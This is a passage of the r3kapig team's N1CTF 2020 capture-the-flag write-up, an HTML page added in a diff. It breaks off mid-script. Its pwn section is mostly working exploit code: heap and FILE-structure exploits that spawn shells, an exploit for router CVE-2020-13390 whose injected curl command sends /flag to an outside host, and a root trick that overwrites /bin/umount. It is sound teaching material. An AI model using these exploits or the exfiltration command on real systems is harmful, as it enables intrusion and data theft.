@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>N1CTF 2020 writeup | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for N1CTF 2020 writeup" />
+    <meta property="og:description" content="Writeup for N1CTF 2020 writeup" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#signin">signin</a>
+    
+                <a class="dropdown-item" href="#escape">escape</a>
+    
+                <a class="dropdown-item" href="#babyrouter">babyrouter</a>
+    
+                <a class="dropdown-item" href="#easywrite">easywrite</a>
+    
+                <a class="dropdown-item" href="#w2l">w2l</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                re
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#oflo">oflo</a>
+    
+                <a class="dropdown-item" href="#oh-my-julia">oh-my-julia</a>
+    
+                <a class="dropdown-item" href="#easy-apk">easy-apk</a>
+    
+                <a class="dropdown-item" href="#n1egg-in-fixed-camera">n1egg-in-fixed-camera</a>
+    
+                <a class="dropdown-item" href="#easyre">easyre</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#signln">signln</a>
+    
+                <a class="dropdown-item" href="#the-king-of-phish(victim-bot)">the-king-of-phish(victim-bot)</a>
+    
+                <a class="dropdown-item" href="#the-king-of-phish(usera-pc)">the-king-of-phish(usera-pc)</a>
+    
+                <a class="dropdown-item" href="#zabbix_fun">zabbix_fun</a>
+    
+                <a class="dropdown-item" href="#easy_tp5">easy_tp5</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#signln-1">signln-1</a>
+    
+                <a class="dropdown-item" href="#allsignin">allsignin</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#vss">vss</a>
+    
+                <a class="dropdown-item" href="#curve">curve</a>
+    
+                <a class="dropdown-item" href="#flagbot">flagbot</a>
+    
+                <a class="dropdown-item" href="#babyproof">babyproof</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#signin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">signin</span>
+            </a>
+    
+<a href="#escape" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">escape</span>
+            </a>
+    
+<a href="#babyrouter" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyrouter</span>
+            </a>
+    
+<a href="#easywrite" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easywrite</span>
+            </a>
+    
+<a href="#w2l" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">w2l</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">re</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#oflo" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">oflo</span>
+            </a>
+    
+<a href="#oh-my-julia" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">oh-my-julia</span>
+            </a>
+    
+<a href="#easy-apk" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easy-apk</span>
+            </a>
+    
+<a href="#n1egg-in-fixed-camera" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">n1egg-in-fixed-camera</span>
+            </a>
+    
+<a href="#easyre" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easyre</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#signln" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">signln</span>
+            </a>
+    
+<a href="#the-king-of-phish(victim-bot)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">the-king-of-phish(victim-bot)</span>
+            </a>
+    
+<a href="#the-king-of-phish(usera-pc)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">the-king-of-phish(usera-pc)</span>
+            </a>
+    
+<a href="#zabbix_fun" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">zabbix_fun</span>
+            </a>
+    
+<a href="#easy_tp5" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easy_tp5</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#signln-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">signln-1</span>
+            </a>
+    
+<a href="#allsignin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">allsignin</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#vss" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">vss</span>
+            </a>
+    
+<a href="#curve" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">curve</span>
+            </a>
+    
+<a href="#flagbot" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">flagbot</span>
+            </a>
+    
+<a href="#babyproof" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyproof</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="n1ctf-2020-writeup"><a class="header-link" href="#n1ctf-2020-writeup"></a>N1CTF 2020 writeup</h1>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>PWN</h2>
+<h3 id="signin"><a class="header-link" href="#signin"></a>Signin</h3>
+<p>漏洞点在于vector的delete后没有清空指针，只是-8，并且没有校验边界，导致了可以一直执行delete操作导致越界。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#context.log_level ='DEBUG'</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span><span class="hljs-params">(choice)</span>:</span>
+    r.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,str(choice))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,num)</span>:</span> 
+    menu(<span class="hljs-number">1</span>)
+    r.sendlineafter(<span class="hljs-string">'dex'</span>,str(idx))
+    r.sendlineafter(<span class="hljs-string">'ber'</span>,str(num))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+    menu(<span class="hljs-number">2</span>)
+    r.sendlineafter(<span class="hljs-string">'dex'</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    menu(<span class="hljs-number">3</span>)
+    r.sendlineafter(<span class="hljs-string">'dex'</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gd</span><span class="hljs-params">(cmd=<span class="hljs-string">''</span>)</span>:</span>
+    gdb.attach(r,cmd)
+    pause()
+libc=ELF(<span class="hljs-string">'./libc.so'</span>)
+<span class="hljs-comment">#r=process('./signin')</span>
+r=remote(<span class="hljs-string">'47.242.161.199'</span>,<span class="hljs-number">9990</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x120</span>):
+    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stage 1'</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xea</span>+<span class="hljs-number">1</span>+<span class="hljs-number">0x139</span><span class="hljs-number">-3</span>):
+    free(<span class="hljs-number">1</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stage 2'</span>
+show(<span class="hljs-number">1</span>)
+r.recvuntil(<span class="hljs-string">':'</span>)
+leak=int(r.recvline(),<span class="hljs-number">10</span>)
+<span class="hljs-keyword">print</span> hex(leak)
+lbase=leak<span class="hljs-number">-96</span><span class="hljs-number">-0x10</span>-libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
+<span class="hljs-keyword">print</span> hex(lbase)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stage 3 start'</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x24d4</span>):
+    free(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">print</span> hex(i)
+<span class="hljs-keyword">print</span> <span class="hljs-string">'stage 3 end'</span>
+add(<span class="hljs-number">1</span>,lbase+libc.symbols[<span class="hljs-string">'__free_hook'</span>]<span class="hljs-number">-8</span>)
+add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68732F6E69622F</span>)
+<span class="hljs-comment">#gd('b system')</span>
+add(<span class="hljs-number">2</span>,lbase+libc.symbols[<span class="hljs-string">'system'</span>])
+add(<span class="hljs-number">2</span>,lbase+libc.symbols[<span class="hljs-string">'system'</span>])
+r.interactive()</code></pre><h3 id="escape"><a class="header-link" href="#escape"></a>escape</h3>
+<p><a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/N1-escape.html">https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/N1-escape.html</a></p>
+<h3 id="babyrouter"><a class="header-link" href="#babyrouter"></a>babyrouter</h3>
+<p>CVE-2020-13390
+entrys mitInterface 跟 page参数使用sprintf导致了栈溢出。
+有00截断，但是调试的时候发现栈似乎不怎么变，所以直接硬编码栈地址试了下远程，直接成了</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+cmd = <span class="hljs-string">';curl -F flag=@/flag vps.exp.sh:1313;'</span>
+
+rop =  <span class="hljs-string">''</span>
+rop += p32(<span class="hljs-number">0xf6fff9ec</span>)
+rop += cmd
+rop += <span class="hljs-string">'A'</span>*(<span class="hljs-number">240</span>-len(cmd) - <span class="hljs-number">4</span>) #padding - len(cmd) - len(<span class="hljs-number">0xf6fff9ec</span>)
+rop += p32(<span class="hljs-number">0xf6fff9ec</span>)        # r4
+rop += p32(<span class="hljs-number">0xf6fff9ec</span> + <span class="hljs-number">16</span>)   # r11
+rop += p32(<span class="hljs-number">0x6B154</span>)           # pc
+# .text:<span class="hljs-number">0006</span>B154                 LDR             R0, [R11,#<span class="hljs-number">-16</span>]
+# .text:<span class="hljs-number">0006</span>B158                 LDR             R1, [R11,#<span class="hljs-number">-20</span>]
+# .text:<span class="hljs-number">0006</span>B15C                 MOV             R2, #<span class="hljs-number">0x1000</span>
+# .text:<span class="hljs-number">0006</span>B160                 BL              doShell
+
+data = {
+    <span class="hljs-string">'entrys'</span>:<span class="hljs-string">'swings'</span>,
+    <span class="hljs-string">'mitInterface'</span>:<span class="hljs-string">'swings'</span>,
+    <span class="hljs-string">'page'</span>:rop
+}
+
+cookie = {<span class="hljs-string">'Cookie'</span>:<span class="hljs-string">'password=swingss'</span>}
+
+# r = requests.post(<span class="hljs-string">'http://127.0.0.1:2333/goform/addressNat'</span>,data = data,cookies=cookie)
+
+r = requests.post(<span class="hljs-string">'http://8.210.119.59:9990/goform/addressNat'</span>,data = data,cookies=cookie)</code></pre><p class="img-container"><img src="https://i.imgur.com/02B6RKV.png" alt=""></p>
+<h3 id="easywrite"><a class="header-link" href="#easywrite"></a>easywrite</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn import *
+
+r = remote(<span class="hljs-string">"124.156.183.246"</span>,<span class="hljs-string">"20000"</span>)
+libc = ELF(<span class="hljs-string">"./libc-2.31.so"</span>)
+context.arch  = libc.arch
+r.recvuntil(<span class="hljs-string">"Here is your gift:"</span>)
+libc.address =int( r.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0</span>x8ec50
+
+def pack_file(<span class="hljs-variable">_flags</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_read_end</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_read_base</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_write_end</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_buf_base</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_buf_end</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_save_base</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_backup_base</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_save_end</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_marker</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_IO_chain</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_fileno</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_lock</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_wide_data</span> = <span class="hljs-number">0</span>,
+              <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>):
+    file_struct = p32(<span class="hljs-variable">_flags</span>) + \
+            p32(<span class="hljs-number">0</span>) + \
+            p64(<span class="hljs-variable">_IO_read_ptr</span>) + \
+            p64(<span class="hljs-variable">_IO_read_end</span>) + \
+            p64(<span class="hljs-variable">_IO_read_base</span>) + \
+            p64(<span class="hljs-variable">_IO_write_base</span>) + \
+            p64(<span class="hljs-variable">_IO_write_ptr</span>) + \
+            p64(<span class="hljs-variable">_IO_write_end</span>) + \
+            p64(<span class="hljs-variable">_IO_buf_base</span>) + \
+            p64(<span class="hljs-variable">_IO_buf_end</span>) + \
+            p64(<span class="hljs-variable">_IO_save_base</span>) + \
+            p64(<span class="hljs-variable">_IO_backup_base</span>) + \
+            p64(<span class="hljs-variable">_IO_save_end</span>) + \
+            p64(<span class="hljs-variable">_IO_marker</span>) + \
+            p64(<span class="hljs-variable">_IO_chain</span>) + \
+            p32(<span class="hljs-variable">_fileno</span>)
+    file_struct = file_struct.ljust(<span class="hljs-number">0</span>x88, <span class="hljs-string">"\x00"</span>)
+    file_struct += p64(<span class="hljs-variable">_lock</span>)
+    file_struct = file_struct.ljust(<span class="hljs-number">0</span>xa0, <span class="hljs-string">"\x00"</span>)
+    file_struct += p64(<span class="hljs-variable">_wide_data</span>)
+    file_struct = file_struct.ljust(<span class="hljs-number">0</span>xc0, <span class="hljs-string">'\x00'</span>)
+    file_struct += p64(<span class="hljs-variable">_mode</span>)
+    file_struct = file_struct.ljust(<span class="hljs-number">0</span>xd8, <span class="hljs-string">"\x00"</span>)
+    return file_struct
+
+def payload_IO_file_finish(libc,<span class="hljs-variable">_IO_str_jumps_addr</span>, system_addr, binsh_addr):
+    payload = pack_file(<span class="hljs-variable">_flags</span> = <span class="hljs-number">0</span>, 
+                    <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>x61, 
+                    <span class="hljs-variable">_IO_read_base</span> = libc.sym[<span class="hljs-string">'_IO_list_all'</span>]-<span class="hljs-number">0</span>x10,
+                    <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>,
+                    <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">1</span>,
+                    <span class="hljs-variable">_IO_buf_base</span> = binsh_addr,
+                    <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>x7fffffff,
+                    <span class="hljs-variable">_wide_data</span> = <span class="hljs-number">0</span>x1eb880+libc,
+                    )
+    payload += p64(<span class="hljs-variable">_IO_str_jumps_addr</span>-<span class="hljs-number">8</span>)
+    payload += p64(<span class="hljs-number">0</span>)
+    payload += p64(system_addr)
+    return payload
+
+message = p32(<span class="hljs-number">0</span>xdeadbeef)*(<span class="hljs-number">0</span>x30-<span class="hljs-number">12</span>)+p64(libc.sym[<span class="hljs-string">'__free_hook'</span>]-<span class="hljs-number">0</span>x8)*<span class="hljs-number">10</span>
+where = flat(libc.address+<span class="hljs-number">0</span>x1f34f0)
+r.sendafter(<span class="hljs-string">"message"</span>,message)
+r.sendafter(<span class="hljs-string">"write?"</span>,where)
+r.sendafter(<span class="hljs-string">"Any last message?"</span>,<span class="hljs-string">"/bin/sh\x00"</span>+p64(libc.sym[<span class="hljs-string">'system'</span>]))
+
+r.interactive()</code></pre><h3 id="w2l"><a class="header-link" href="#w2l"></a>W2L</h3>
+<p>权限没配好, 非预期解了</p>
+<pre class="hljs"><code>mv bin bin1
+<span class="hljs-regexp">/bin1/m</span>kdir bin
+<span class="hljs-regexp">/bin1/</span>chmod <span class="hljs-number">777</span> bin
+<span class="hljs-regexp">/bin1/</span>echo <span class="hljs-string">"/bin1/cat /root/flag"</span> &gt; <span class="hljs-regexp">/bin/um</span>ount
+<span class="hljs-regexp">/bin1/</span>chmod <span class="hljs-number">777</span> <span class="hljs-regexp">/bin/um</span>ount
+<span class="hljs-keyword">exit</span></code></pre><h2 id="re"><a class="header-link" href="#re"></a>Re</h2>
+<h3 id="oflo"><a class="header-link" href="#oflo"></a>Oflo</h3>
+<p>签到题，子进程执行cat，父进程ptrace上去，获取结果作为key，然后异或</p>
+<pre class="hljs"><code>s = list(b<span class="hljs-string">"Linux version 4.19.104-microsoft-standard ("</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">14</span>]
+res = [<span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">17</span>, <span class="hljs-number">26</span>, <span class="hljs-number">73</span>, <span class="hljs-number">125</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">43</span>, <span class="hljs-number">59</span>, <span class="hljs-number">62</span>, <span class="hljs-number">61</span>, <span class="hljs-number">60</span>, <span class="hljs-number">95</span>]
+<span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> range(<span class="hljs-number">14</span>):
+    res[i] ^= s[i] + <span class="hljs-number">2</span>
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b<span class="hljs-string">"n1ctf"</span> + bytes(res)</span></span>)</code></pre><h3 id="oh-my-julia"><a class="header-link" href="#oh-my-julia"></a>Oh My Julia</h3>
+<p>x64dbg调试，输入时下断点，跟出来到Julia编译后的地方，分析出算法。
+flag分为5部分校验，用_分割
+校验分别为直接对比，异或，中国剩余定理，简单位运算加密，快速幂。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
+<span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce
+<span class="hljs-keyword">import</span> copy
+<span class="hljs-keyword">import</span> math
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
+    <span class="hljs-string">"""扩展欧几里得"""</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> == b:
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a
+    x, y, q = egcd(b, a % b)
+    x, y = y, (x - a // b * y)
+    <span class="hljs-keyword">return</span> x, y, q
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chinese_remainder</span><span class="hljs-params">(pairs)</span>:</span>
+    <span class="hljs-string">"""中国剩余定理"""</span>
+    mod_list, remainder_list = [p[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pairs], [p[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pairs]
+    mod_product = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, mod_list)
+    mi_list = [mod_product//x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mod_list]
+    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(mi_list))]
+    x = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(remainder_list)):
+        x += mi_list[i] * mi_inverse[i] * remainder_list[i]
+        x %= mod_product
+    <span class="hljs-keyword">return</span> x
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rol</span><span class="hljs-params">(a, b)</span>:</span>
+    <span class="hljs-keyword">return</span> (a &lt;&lt; b | a &gt;&gt; (<span class="hljs-number">8</span>-b)) &amp; <span class="hljs-number">0xff</span>
+
+a = <span class="hljs-string">b"n0w"</span>
+b = bytes(list(map(<span class="hljs-keyword">lambda</span> x: x ^ <span class="hljs-number">0xB1</span>, [<span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xC4</span>])))
+
+c = chinese_remainder([(<span class="hljs-number">0x1337</span>, <span class="hljs-number">0x8FF</span>), (<span class="hljs-number">0x18d9</span>, <span class="hljs-number">0x105a</span>), (<span class="hljs-number">0x245f</span>, <span class="hljs-number">0x1595</span>)])
+c = pack(<span class="hljs-string">"&lt;I"</span>, c)
+
+s = Solver()
+d = [BitVec(<span class="hljs-string">"x%d"</span>%i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]
+k = copy.copy(d)
+d[<span class="hljs-number">0</span>] = rol(d[<span class="hljs-number">0</span>], <span class="hljs-number">2</span>)
+d[<span class="hljs-number">2</span>] = rol(d[<span class="hljs-number">2</span>], <span class="hljs-number">3</span>)
